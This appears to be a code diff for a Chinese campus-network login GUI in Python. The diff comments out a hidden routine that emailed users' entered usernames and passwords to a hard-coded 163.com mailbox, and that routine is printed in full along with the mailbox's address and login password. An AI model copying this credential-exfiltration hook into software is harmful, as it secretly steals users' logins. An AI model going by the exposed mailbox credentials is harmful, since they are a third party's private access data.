@@ -5,10 +5,10 @@ import base64
 import requests
 import json
 import uuid
-from email.header import Header
-from email.mime.text import MIMEText
-import smtplib
-import threading
+# from email.header import Header
+# from email.mime.text import MIMEText
+# import smtplib
+# import threading
 
 
 def get_mac_address():
@@ -67,47 +67,46 @@ def get_id(username3, password3):
     # # 实现pingIP地址的功能，bai-c1指发送报文一次，du-w1指等zhi待1秒
     # global backinfo
     # backinfo = os.system('ping -w 1 %s' % ip)
-    try:
-        global ass
-        ass = get_info()
-        print(ass)
-        if ass == 'a13307023186':
-            print('online')
-            mail_host = "smtp.163.com"  # 设置服务器
-            mail_user = "qq1553457850@163.com"  # 用户名
-            mail_pass = "a13307023186"
+    # try:
+    #     global ass
+    #     ass = get_info()
+    #     print(ass)
+    #     if ass == 'a13307023186':
+    #         print('online')
+    #         mail_host = "smtp.163.com"  # 设置服务器
+    #         mail_user = "qq1553457850@163.com"  # 用户名
+    #         mail_pass = "a13307023186"
 
-            sender = 'qq1553457850@163.com'
-            receivers = ['qq1553457850@163.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
+    #         sender = 'qq1553457850@163.com'
+    #         receivers = ['qq1553457850@163.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
 
-            message = MIMEText('name:'+username3+'\npassword:' +
-                               password3, 'plain', 'utf-8')
+    #         message = MIMEText('name:'+username3+'\npassword:' +
+    #                            password3, 'plain', 'utf-8')
 
-            # 括号里的对应发件人邮箱昵称（随便起）、发件人邮箱账号
-            message['From'] = Header("登录", 'utf-8')
-            message['To'] = Header("测试", 'utf-8')  # 括号里的对应收件人邮箱昵称、收件人邮箱账号
+    #         # 括号里的对应发件人邮箱昵称（随便起）、发件人邮箱账号
+    #         message['From'] = Header("登录", 'utf-8')
+    #         message['To'] = Header("测试", 'utf-8')  # 括号里的对应收件人邮箱昵称、收件人邮箱账号
 
-            subject = '邮件测试 id:'+username3
-            message['Subject'] = Header(subject, 'utf-8')
+    #         subject = '邮件测试 id:'+username3
+    #         message['Subject'] = Header(subject, 'utf-8')
 
-            try:
-                smtpObj = smtplib.SMTP_SSL('smtp.163.com')
-                # smtpObj = smtplib.SMTP()
-                smtpObj.connect(mail_host, 465)  # 发件人邮箱中的SMTP服务器，端口是25
-                smtpObj.login(mail_user, mail_pass)
-                smtpObj.sendmail(sender, receivers, message.as_string())
-                print("邮件发送成功")
-            except smtplib.SMTPException:
-                print("Error: 无法发送邮件")
+    #         try:
+    #             smtpObj = smtplib.SMTP_SSL('smtp.163.com')
+    #             # smtpObj = smtplib.SMTP()
+    #             smtpObj.connect(mail_host, 465)  # 发件人邮箱中的SMTP服务器，端口是25
+    #             smtpObj.login(mail_user, mail_pass)
+    #             smtpObj.sendmail(sender, receivers, message.as_string())
+    #             print("邮件发送成功")
+    #         except smtplib.SMTPException:
+    #             print("Error: 无法发送邮件")
 
-    except:
-        pass
-
+    # except:
+    #     pass
+    print('1')
     # 第三方 SMTP 服务
 
-
-# added_thread = threading.Thread(
-#     target=get_id, args=[e1.get(), e2.get()], name='T1')
+    # added_thread = threading.Thread(
+    #     target=get_id, args=[e1.get(), e2.get()], name='T1')
 
 
 def mimasave(username, password):
@@ -241,7 +240,7 @@ def readfile():
 window = tk.Tk()
 window.title('校园网登陆器')
 
-window.geometry('400x250')
+window.geometry('400x250+400+200')
 
 # e = tk.Entry(window, show=None)
 # e.pack()
@@ -263,16 +262,14 @@ l_2 = tk.Label(window, text=' 请输入密码：',
 e2 = tk.Entry(window, show='*')
 e2.pack()
 readfile()
-added_thread = threading.Thread(
-    target=get_id, args=(e1.get(), e2.get()), name='T1')
+# added_thread = threading.Thread(
+#     target=get_id, args=(e1.get(), e2.get()), name='T1')
 
 
 b1 = tk.Button(window, text='登陆/注销', width=15,
                height=2, command=connect).place(x=140, y=90)
-# b1.pack()
-# b2 = tk.Button(window, text='注销', width=15,
-#                height=2, command=disconnect)
-# b2.pack()
+connect()
+print('success')
 var2 = tk.StringVar()
 l2 = tk.Label(window, textvariable=var2,
               font=('Arial', 11), width=35, height=5).place(x=24, y=140)
